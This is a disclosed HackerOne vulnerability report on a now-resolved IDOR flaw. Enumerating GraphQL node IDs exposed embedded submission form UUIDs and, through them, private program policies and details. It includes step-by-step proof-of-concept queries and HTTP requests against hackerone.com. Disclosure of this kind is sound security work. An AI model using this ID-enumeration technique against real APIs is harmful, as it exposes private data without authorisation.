---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/insecure-direct-object-reference-idor
  - env/appliance
  - trigger/auth-required
  - trigger/brute-force
substate: "resolved"
weakness: "Insecure Direct Object Reference (IDOR)"
enriched: true
body: true
date: 2019-01-11
submitted: 2018-11-21T00:42:31.538Z
bounty_usd: null
votes: 54
cve: []
program: "[[programs/security|HackerOne]]"
reporter: "jobert"
source: "https://hackerone.com/reports/447930"
title: "Embedded submission form UUIDs can be enumerated through GraphQL node interface, exposing sensitive program details"
---
# Embedded submission form UUIDs can be enumerated through GraphQL node interface, exposing sensitive program details

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 54 | **Program:** HackerOne | **Disclosed:** 2019-01-11

- Report: [https://hackerone.com/reports/447930](https://hackerone.com/reports/447930)
- CWE: Insecure Direct Object Reference (IDOR)
- Submitted: 2018-11-21T00:42:31.538Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

It's possible for an attacker to enumerate embedded submission form UUIDs through HackerOne's GraphQL node interface. In normal application behavior, an embedded submission form is queried through GraphQL with a UUID. These UUIDs are random and they're not susceptible to brute force attacks. However, the UUID is not the primary key of these models. Instead, in the backend, it still has an auto incremental primary key. Because of that they can be queried directly using the node interface. From the node interface, the UUID is exposed, which can then be used to obtain the same information an invited reporter can access.

# Proof of concept
In order to reproduce the vulnerability, follow the steps below.

 - consider the following node ID: `Z2lkOi8vaGFja2Vyb25lL0VtYmVkZGVkU3VibWlzc2lvbkZvcm0vOQ==`
 - decode the ID (base64), which will look something like `gid://hackerone/EmbeddedSubmissionForm/9`
 - change the primary key identifier, and base64 encode it
 - execute the following GraphQL query:

**Request**
```
query {
  node(id: "Z2lkOi8vaGFja2Vyb25lL0VtYmVkZGVkU3VibWlzc2lvbkZvcm0vOQ==") {
    ... on EmbeddedSubmissionForm {
      uuid
    }
  }
}
```

**Response**
```json
{
  "data": {
    "node": {
      "id": "Z2lkOi8vaGFja2Vyb25lL0VtYmVkZGVkU3VibWlzc2lvbkZvcm0vOQ==",
      "uuid": "████"
    }
  }
}
```

 - take the UUID, and append `?embedded_submission_form_uuid=:uuid` to the GraphQL request
 - submit the following query to obtain the program information:

**Request**
```
POST /graphql?embedded_submission_form_uuid=█████████ HTTP/1.1
Host: hackerone.com
...

{"query":"query { node(id: \"Z2lkOi8vaGFja2Vyb25lL0VtYmVkZGVkU3VibWlzc2lvbkZvcm0vOQ==\") { ... on EmbeddedSubmissionForm { id, uuid team { handle policy } }}}","variables":{}}
```

**Response**
```json
{
  "data": {
    "node": {
      "id": "Z2lkOi8vaGFja2Vyb25lL0VtYmVkZGVkU3VibWlzc2lvbkZvcm0vOQ==",
      "uuid": "███",
      "team": {
        "handle": "██████████",
        "policy": "The policy."
      }
    }
  }
}
```

## Impact

Any unauthenticated user can obtain the same information about a private program as a participating hacker. This may reveal sensitive information about private programs on HackerOne, such as their policy, terms, resolved bug count, bounty table, etc.

There are essentially two vulnerabilities here: the ability to directly query the `EmbeddedSubmissionForm` object and the fact that by specifying a UUID, the `Team` object exposes too much information.

## Timeline

- **Report Filed**
- **Report Triaged**
- **Not Eligible For Bounty**
- **Report Resolved**
- **External User Invited**
- **External User Invited**
- **External User Invited**
- **External User Invited**
- **External User Invited**
- **External User Joined**
- **External User Joined**
- **External User Joined**
- **External User Joined**
- **External User Joined**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
